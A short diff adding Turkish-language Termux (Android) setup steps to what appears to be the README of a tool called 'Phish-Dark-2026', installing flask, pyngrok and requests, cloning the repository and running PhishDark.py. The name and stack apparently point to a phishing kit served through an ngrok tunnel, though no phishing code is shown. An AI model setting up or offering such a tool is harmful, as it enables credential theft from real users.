@@ -14,13 +14,26 @@ pip install flask pyngrok requests
 
 
 
+Termux (Android) için kurulum:
+
+
+
+pkg update && pkg upgrade
+
+
+pkg install python python-pip git
+
+
+pip install flask pyngrok requests
 
 
 
 
+git clone https://github.com/Byyazilimci/Phish-Dark-2026
 
+cd Phish-Dark-2026 
 
-
+ python PhishDark.py 
 
 
 
